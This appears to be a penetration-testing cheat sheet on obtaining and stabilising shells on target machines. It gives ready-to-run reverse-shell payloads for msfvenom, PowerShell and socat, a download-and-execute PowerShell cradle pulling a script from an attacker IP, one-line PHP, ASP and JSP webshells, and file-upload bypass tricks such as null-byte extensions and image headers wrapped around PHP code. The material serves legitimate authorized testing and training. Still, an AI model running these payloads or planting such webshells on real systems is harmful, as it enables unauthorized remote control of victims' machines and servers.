# Shells

## Table of contents

##### ➤ Shells

* [Reverse shell](#reverse-shell)
* [One liner](#one-liner)
* [Webshell](#webshell)
* [Online generator](#online-generator)

##### ➤ Upload bypass

* [Rename the extension](#rename-the-extension)
* [Bypass the extension checks](#bypass-the-entension-checks)
* [Bypass using the content-type](#bypass-using-the-content-type)
* [Magic number](#magic-number)


##### ➤ Shell Stabilisation

* [Technique 01: Python](#technique-01-python)
* [Technique 02: Rlwrap](#technique-02-rlwrap)
* [Technique 03: Socat](#technique-03-socat)



# 
# ⭕ Shells

## 🔻Reverse shell

#### ➤ Linux - MSFVenom
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

#### ➤ Windows - MSFVenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

#### ➤ Powershell
```
powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.194',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### ➤ ASP
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

#### ➤ ASPX
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx
```

#### ➤ JSP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

#### ➤ WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

#### ➤ PHP
```
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

#### ➤ HTA
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh > shell.hta
```

#### ➤ DLL
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
```

#### ➤ Upload and execution
```
# This reverse shell download a reverse shell name Invoke-PowerShellTcp.ps1 and execute it to obtain a reverse shell
# Reverse shell : https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
# Raw direct link : https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
powershell iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1:4444/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 443
```


## 🔻Single line Webshell

#### ➤ PHP
```
<?php echo passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
```

#### ➤ ASP
```
<% eval request("cmd") %>
```

#### ➤ JSP
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```



## 🔻Online Generator
https://www.revshells.com/
https://weibell.github.io/reverse-shell-generator/

# 
# ⭕ Upload Bypass

## 🔻Rename the extension 
```
• PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module

• PHP8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp

• ASP: asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml

• PERL: .pl, .pm, .cgi, .lib

• JSP: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action

• Coldfusion: .cfm, .cfml, .cfc, .dbm

• Flash: .swf

• Erlang Yaws Web Server: .yaws
```

## 🔻Bypass the extension checks

#### ➤ Using some uppercase letters
```
pHp, .pHP5, .aSPx, .jSp ...
```

#### ➤ Adding a valid extension before

• As example, if the png are the only authorized extension:
```
reverseshell.png.php
```

• It is also possible to use the the uppercase letters
```
reverseshell.png.Php5
reverseshell.png.pHTml
``` 

#### ➤ Add special characters at the end

• Some examples
```
reverseshell.php%20
reverseshell.php%0a
reverseshell.php%00
reverseshell.php%0d%0a
reverseshell.php/
reverseshell.php.\
reverseshell.
reverseshell.php....
```

• It is also possible to combine with the previous bypass
```
reverseshell.php5%0a
reverseshell.pHP5%0a
```

#### ➤ Add a double extension and a junk data between them

• Some examples
```
reverseshell.php#.png
reverseshell.php%00.png
reverseshell.php\x00.png
reverseshell.php%0a.png
reverseshell.php%0d%0a.png
reverseshell.phpJunk123png
```

• It is also possible to combine with the uppercase
```
reverseshell.png%00pHp5
```

#### ➤ Add another layer of extensions

• Some examples
```
file.png.jpg.php
```

• It is also possible to combine with the uppercase
```
file.php%00.png%00.jpg
file.pHp%00.pNg%00.jPg
```

## 🔻Bypass using the content-type

Example of content-type :
- image/jpeg
- application/pdf

#### ➤ 1. Initial request (upload of php reverse shell)

![image](https://github.com/Kiosec/Shells/assets/100965892/609150ce-69ac-4769-99cf-155e9d78eeae)


#### ➤ 2. Burp interception and modification 

![image](https://github.com/Kiosec/Shells/assets/100965892/27a84575-0816-419b-86da-3d2972badfb5)


## 🔻Magic number

An image is identified by its first bytes. It is possible to hide a webshell by including a valid img header at the beginning of the webshell file.

#### ➤ GIF
```
Basically you just add the text "GIF89a;" before you shell-code. As exemple :

GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>
```

#### ➤ JPEG
```
printf "\xff\xd8\xff\xe0<?php system('id'); ?>" > image?jpg
```

#### ➤ Inject PHP code into into information/comment of the image
```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.jpg
```



# 
# ⭕ Shell Stabilisation

## 🔻Technique 01: Python
```
➤ Step 01 : uses Python to spawn a better featured bash shell
python -c 'import pty;pty.spawn("/bin/bash")'

➤ Step 02: this will give us access to term commands such as clear
export TERM=xterm

➤ Step 03: background the shell using Ctrl + Z
CRTL+Z

➤ Step 04: Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
stty raw -echo; fg

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.

➤ Example: 
kiosec@lab:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.0.0.1] from (unknown) [10.1.1.1] 43298

python3 -c 'import pty;pty.spawn("/bin/bash")'
user@box:~$ export TERM=xterm
export TERM=xterm
user@box:~$ ^Z
[1]+ Stopped            sudo nc -lvnp 443
kiosec@lab:~$ stty rauw -echo; fg
nc -lvnp 443

user@box:~$ whoami
user
user@box:~$ ^C
user@box:~$
```

## 🔻Technique 02: Script
```
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
kiosec@mycyberlab:/home/kiosec$
```

## 🔻Technique 03: Rlwrap
rlwrap gives a more fully featured shell including access to history, tab autocompletion and the arrow keys immediately upon receiving a shell.
This technique is particularly useful with the Windows shell.

```
➤ Step 01: Install rlwrap (not installed by default on the kali)
apt install rlwrap

➤ Step 02: Invoke the listener.
rlwrap nc -lnvp <port> 

[additional steps for Linux target]
➤ Step 03: background the shell using Ctrl + Z
CRTL+Z

➤ Step 04: Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
stty raw -echo; fg
```

## 🔻Technique 03: Socat
Restricted to Linux target

```
➤ Prerequisite: Obtain Socat on the linux target.

➤ Step 01: Transfer a socat static compiled binary (e.g., using python http.server)
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true

➤ Step 02: On the Kali
socat TCP-L:<port> FILE:`tty`,raw,echo=0

➤ Step 03: execute the reverse shell on the target.

➤ Step 04: Once connected to the target, execute the sepcial socal command in order to 
socat TCP:<kali-attacker-ip>:<kali-attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
